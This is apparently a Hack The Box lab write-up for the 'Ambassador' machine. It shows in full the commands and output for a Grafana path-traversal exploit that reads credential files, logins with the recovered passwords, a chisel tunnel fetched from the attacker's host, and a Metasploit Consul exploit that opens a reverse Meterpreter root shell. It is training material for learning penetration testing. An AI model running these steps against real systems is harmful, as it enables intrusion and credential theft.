---
layout: single
title: Ambassador hackthebox writeup
excerpt: "Medium linux machine in which we exploit a CVE get credentials to a MySQL db then get ssh credentials and lastly find a consul token in a git repository to get root"
date: 2023-01-18
classes: wide
header:
  teaser: /assets/images/ambassador/ambassador_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - MySQL
  - git
  - port forwarding
  - grafana
  - consul
---

![](/assets/images/ambassador/ambassador.png)

## User Flag

First of all port scanning

```shell
$ nmap -Pn -sS -n -p- -v --min-rate 5000 -oN allports 10.10.11.183

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  MySQL
```

four TCP ports are open, let's scan them more deeply.

```shell
$ nmap -sCV -p22,80,3000,3306 -vv -oN targeted 10.10.11.183

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
...
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found
...
3306/tcp open  MySQL   syn-ack ttl 63 MySQL 8.0.30-0ubuntu0.20.04.2
| MySQL-info:
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
...
```

We have the usual ssh and http but there is also what seems to be another http service running on port 3000 and a MySQL database.

On the webpage on port 80, we find a curious sentence `Use the developer account to SSH, DevOps will give you the password.`. So we know one user is present in the machine. On the other hand, on port 3000 we find a *Grafana* login page, by searching the version on the internet I found it is vulnerable to LFI and also [this exploit](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798). It seems that the application is vulnerable to LFI in the `/public/plugins/` + Plugin name  directory.

Now just change the contents of the `targets.txt` folder to the corresponding IP and run it.

```shell
$ python3 exploit.py
  _____   _____   ___ __ ___ _     _ _ ________ ___ ___
 / __\ \ / / __|_|_  )  \_  ) |___| | |__ /__  / _ ( _ )
| (__ \ V /| _|___/ / () / /| |___|_  _|_ \ / /\_, / _ \
 \___| \_/ |___| /___\__/___|_|     |_|___//_/  /_/\___/
                @pedrohavay / @acassio22

? Enter the target list:  targets.txt

========================================

[i] Target: http://10.10.11.183:3000


[i] Analysing files...

[i] File "/conf/defaults.ini" found in server.
http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2fconf/defaults.ini
[*] File saved in "./http_10_10_11_183_3000/defaults.ini".

[i] File "/etc/grafana/grafana.ini" found in server.
http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/grafana.ini
[*] File saved in "./http_10_10_11_183_3000/grafana.ini".

[i] File "/etc/passwd" found in server.
http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
[*] File saved in "./http_10_10_11_183_3000/passwd".

[i] File "/var/lib/grafana/grafana.db" found in server.
http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/grafana/grafana.db
[*] File saved in "./http_10_10_11_183_3000/grafana.db".

[i] File "/proc/self/cmdline" found in server.
http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/cmdline
[*] File saved in "./http_10_10_11_183_3000/cmdline".

? Do you want to try to extract the passwords from the data source?  Yes

[i] Secret Key: SW2YcwTIb9zpOOhoPsMm

[*] Bye Bye!
```

Now by looking at the files we find a couple of passwords, First the login credentials for *Grafana*


```shell
$ cat grafana.ini| grep -E 'admin_password|admin_user'

admin_user = admin
admin_password = messageInABottle685427
```

This seems to be useless however, we have more files to look at. By searching inside the database we found the credentials for the MySQL database.

```shell
$ sqlite3 grafana.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt
alert_configuration         migration_log
alert_instance              ngalert_configuration
alert_notification          org
alert_notification_state    org_user
alert_rule                  playlist
alert_rule_tag              playlist_item
alert_rule_version          plugin_setting
annotation                  preferences
annotation_tag              quota
api_key                     server_lock
cache_data                  session
dashboard                   short_url
dashboard_acl               star
dashboard_provisioning      tag
dashboard_snapshot          team
dashboard_tag               team_member
dashboard_version           temp_user
data_source                 test_data
kv_store                    user
library_element             user_auth
library_element_connection  user_auth_token
sqlite> .dump data_source
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE `data_source` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `org_id` INTEGER NOT NULL
, `version` INTEGER NOT NULL
, `type` TEXT NOT NULL
, `name` TEXT NOT NULL
, `access` TEXT NOT NULL
, `url` TEXT NOT NULL
, `password` TEXT NULL
, `user` TEXT NULL
, `database` TEXT NULL
, `basic_auth` INTEGER NOT NULL
, `basic_auth_user` TEXT NULL
, `basic_auth_password` TEXT NULL
, `is_default` INTEGER NOT NULL
, `json_data` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0);
INSERT INTO data_source VALUES(2,1,1,'MySQL','MySQL.yaml','proxy','','dontStandSoCloseToMe63221!','grafana','grafana',0,'','',0,X'7b7d','2022-09-01 22:43:03','2023-01-18 09:56:11',0,'{}',1,'uKewFgM4z');
COMMIT;
```

With this information let's connect to MySQL.

```shell
$ MySQL -u grafana -p -h 10.10.11.183 -D grafana
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 119
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
MySQL [grafana]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| MySQL              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.047 sec)

MySQL [grafana]> use whackywidget
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.046 sec)

MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

We have the developer password base64 encoded, let's just decode it and get our user flag.


```shell
$ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
$ ssh developer@10.10.11.183
developer@10.10.11.183's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

developer@ambassador:~$
```

## Root flag

By using the usual check for privesc I found a strange directory in /opt. It is a git repository so I checked the older commits

```shell
$ cd /opt
developer@ambassador:/opt$ ls
consul  my-app
developer@ambassador:/opt$ cd my-app/
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app$ git diff c982db8eff6f10f8f3a7d802f79f2705e7a21b55
diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running

-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/MySQL_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/MySQL_pw $MYSQL_PASSWORD
```

This app is suing consul which is a fairly complex software to connect various systems. By searching on the internet for ways to privesc with consul the exploitdb page comes up, It also says the exploit is available in metasploit. This exploit works by making a request to the API running on port 8500, then we execute code sending a PUT request to `/v1/agent/check/register`.

However, we can't execute metasploit in the ambassador machine so we need to do port forwarding first. Thus we need to get chisel to the victim's machine and then proceed with the port forwarding


```shell
[dasor@archlinux ~/hacking_tools]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
...
developer@ambassador:/dev/shm$ wget 10.10.14.175:8000/chisel
--2023-01-18 19:37:19--  http://10.10.14.175:8000/chisel
Connecting to 10.10.14.175:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14438400 (14M) [application/octet-stream]
Saving to: ‘chisel’

chisel                           100%[==========================================================>]  13.77M  6.81MB/s    in 2.0s

2023-01-18 19:37:21 (6.81 MB/s) - ‘chisel’ saved [14438400/14438400]
```

Now let's run it

```shell
[dasor@archlinux ~/hacking_tools]$ ./chisel server -p 7777 --reverse
2023/01/18 20:39:11 server: Reverse tunnelling enabled
2023/01/18 20:39:11 server: Fingerprint Bydycy1BjfpGYuZSEugEcvtxFge0yrgH1FY9C/i0KMg=
2023/01/18 20:39:11 server: Listening on http://0.0.0.0:7777
...
developer@ambassador:/dev/shm$ ./chisel client 10.10.14.175:7777 R:8500:127.0.0.1:8500
2023/01/18 19:39:31 client: Connecting to ws://10.10.14.175:7777
2023/01/18 19:39:31 client: Connected (Latency 45.659552ms)
```

Lastly, let's run metasploit

```shell
msfconsole -q
msf6 > grep consul search consul type:exploit
msf6 > grep consul search consul type:exploit
   3  exploit/multi/misc/consul_rexec_exec                     2018-08-11       excellent  Yes    Hashicorp Consul Remote Command Execution via Rexec
   4  exploit/multi/misc/consul_service_exec                   2018-08-11       excellent  Yes    Hashicorp Consul Remote Command Execution via Services API
msf6 > use 4
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/misc/consul_service_exec) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/misc/consul_service_exec) > set LHOST 10.10.14.175
LHOST => 10.10.14.175
msf6 exploit(multi/misc/consul_service_exec) > set ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5
ACL_TOKEN => bb03b43b-1d81-d62b-24b5-39540ee469b5
msf6 exploit(multi/misc/consul_service_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.175:4444
[*] Creating service 'tJRjJQqb'
[*] Service 'tJRjJQqb' successfully created.
[*] Waiting for service 'tJRjJQqb' script to trigger
[*] Sending stage (1017704 bytes) to 10.10.11.183
[*] Meterpreter session 1 opened (10.10.14.175:4444 -> 10.10.11.183:60006) at 2023-01-18 20:44:35 +0100
[*] Removing service 'tJRjJQqb'
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > shell
Process 32677 created.
Channel 1 created.
whoami
root
```

And That is all. Thanks for reading!
